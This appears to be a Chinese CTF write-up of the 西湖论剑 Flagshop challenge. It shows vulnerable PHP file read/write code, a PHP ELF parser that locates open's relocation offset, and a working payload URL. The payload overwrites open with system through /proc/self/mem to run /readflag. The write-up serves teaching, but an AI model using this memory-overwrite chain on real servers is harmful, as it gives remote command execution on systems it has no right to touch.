本文首发于“合天智汇”公众号 作者：xiaoleung

title: 西湖论剑 Flagshop 分析复现

date: 2020-10-13 13:12:04

tags: CTF

# 本文推荐实验

PWN综合练习（三）

[实验:PWN综合练习（三）(合天网安实验室)](https://sourl.cn/7yyUQY)

CTF PWN进阶训练实战，基于两次缓冲区溢出来获取服务器控制权限。

# toc: true

# 前言

  * 比赛时候没能做出来，其实这道题就是一道pwn题。后面与p w n师傅讨论分析EXP分析还原了解题过程。学到了很多，也希望分享给大家。

# 任意文件读取

  * 抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。

![](https://image.3001.net/images/20201103/1604384950_5fa0f8b689bdaa5e000bd.png!small)

  * 读取题目全部源码：

> backend.php
    
    
    <?php
    
    $offset = isset($_GET['offset']) ? $_GET['offset'] : 0;
    $buffer = isset($_GET['buffer']) ? $_GET['buffer'] : "";
    
    if (isset($_GET['writefile'])) {
        $fp = fopen($_GET['writefile'], "a");
        fseek($fp, $offset);
        fwrite($fp, $buffer);
        fclose($fp);
    }
    
    if (isset($_GET['readfile'])) {
        echo file_get_contents($_GET['readfile']);
    }
    ?>

> index.php
    
    
    <?php
    
    if(!isset($_COOKIE['sandbox'])) {
      $uuid = system("/var/www/html/copy");
      setcookie("sandbox", $uuid);
      header("Location: sandbox/".$uuid);
    } else {
      header("Location: sandbox/".$_COOKIE['sandbox']);
    }

# 文件写入

  * 从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。
  * 做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(https://www.pianshen.com/article/4537767804/)

# 内存泄露和动态链接库

> /proc/self/maps 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:
    
    
    address           perms offset  dev   inode   pathname
    08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
    08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
    08058000-0805b000 rwxp 00000000 00:00 0
    40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
    40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
    4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
    40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
    4013e000-40142000 rw-p 00000000 00:00 0
    bffff000-c0000000 rwxp 00000000 00:00 0

  * 通过SSRF漏洞直接读取/proc/self/maps来泄露当前程序调用的到动态链接库和内存地址。

![](https://image.3001.net/images/20201103/1604384965_5fa0f8c57948f6f9ffd9e.png!small)

  * 直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：0x0000000000046590

![](https://image.3001.net/images/20201103/1604384976_5fa0f8d0c21db95adfbf5.png!small)

  * 我们将动态链接库的地址加上system的偏移就能计算出system函数的地址。

    
    
    <?php
    echo dechex(0x7ffff5f40000+0x0000000000046590);
    //system函数结果：0x7ffff5f86590
    ?>

# 计算偏移

  * 我们知道system函数的地址，我们就可以将open函数的地址替换为system函数的地址，我们在file_get_contents传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。
  * 这里需要用到/proc/self/exe

>
> 在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.
> 在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.

  * 同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。

    
    
    <?php
    function packlli($value) {
        $higher = ($value & 0xffffffff00000000) >> 32;
        $lower = $value & 0x00000000ffffffff;
        return pack('V2', $lower, $higher);
    }
    
    function unp($value) {
        return hexdec(bin2hex(strrev($value)));
    }
    function parseelf($bin_ver, $rela = false) {
        $bin = file_get_contents($bin_ver);
        $e_shoff = unp(substr($bin, 0x28, 8));
        $e_shentsize = unp(substr($bin, 0x3a, 2));
        $e_shnum = unp(substr($bin, 0x3c, 2));
        $e_shstrndx = unp(substr($bin, 0x3e, 2));
    
        for($i = 0; $i < $e_shnum; $i += 1) {
            $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
            if($sh_type == 11) { // SHT_DYNSYM 
                $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
                $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
            }
            elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
                $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            }
            elseif($rela && $sh_type == 4) { // SHT_RELA
                $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
                $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
            }
        }
    
        if($rela) {
            for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
                $r_offset = unp(substr($bin, $i, 8));
                $r_info = unp(substr($bin, $i + 8, 8)) >> 32;
                $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "\0") {
                    $name .= $bin[$j];
    
                }
    
                if($name == 'open') {
                    return $r_offset;
                }
            }
        }
        else {
            for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
                $name_off = unp(substr($bin, $i, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "\0") {
                    $name .= $bin[$j];
                }
                if($name == '__libc_system') {
                    $system_offset = unp(substr($bin, $i + 8, 8));
                }
                if($name == '__open') {
                    $open_offset = unp(substr($bin, $i + 8, 8));
                }
            }
            return array($system_offset, $open_offset);
        }
    }
    $open_php = parseelf('exe', true);
    //$maps = file_get_contents('lib.txt');
    //$pie_base =(hexdec(explode('-', $maps)[0]));
    echo $open_php;
    //结果：15333784
    ?>

# 修改进程内存

>
> /proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。

  * 也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。

    
    
    backend.php?readfile=/readflag>/tmp/i_o_u_hlq&writefile=/proc/self/mem&buffer=%90%65%f8%f5%ff%7f&offset=15333784

  * 直接读取/tmp/i_o_u_hlq就可以直接getflag

![](https://image.3001.net/images/20201103/1604384990_5fa0f8dea56457f9e35bb.png!small)

# 参考

  * Nu1L 西湖论剑wp
  * <https://blog.spoock.com/2019/10/08/proc/>
  * <https://www.pianshen.com/article/4537767804/>

